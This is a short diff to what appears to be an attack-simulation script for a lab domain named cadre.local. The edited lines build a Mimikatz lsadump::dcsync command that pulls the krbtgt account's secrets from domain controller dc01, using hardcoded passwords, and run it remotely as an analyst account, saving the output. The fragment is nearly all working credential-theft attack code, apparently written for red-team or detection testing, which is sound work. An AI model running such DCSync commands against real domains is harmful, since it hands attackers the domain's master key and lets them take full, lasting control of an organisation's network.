@@ -10,7 +10,7 @@ echo "=== T009 | ${CASE_ID} | T0=${T0} ==="
 
 ws01_ensure_mimikatz
 
-MK_CMD="lsadump::dcsync /domain:cadre.local /user:krbtgt /dc:dc01.cadre.local /authuser:chief_command /authpassword:C0mm@nd_Ch1ef! /authdomain:cadre"
+MK_CMD="lsadump::dcsync /domain:cadre.local /user:CN=krbtgt,CN=Users,DC=cadre,DC=local /dc:dc01.cadre.local /authuser:chief_command /authpassword:C0mm@nd_Ch1ef! /authdomain:cadre.local"
 ws01_exec_as analyst_t1 'T13r_An@lyst!' \
   "C:\Tools\cadre-attack\mimikatz.exe \"${MK_CMD}\" exit 2>&1 | Tee-Object C:\Tools\cadre-attack\dcsync-out.txt; Get-Content C:\Tools\cadre-attack\dcsync-out.txt -Tail 30"
 
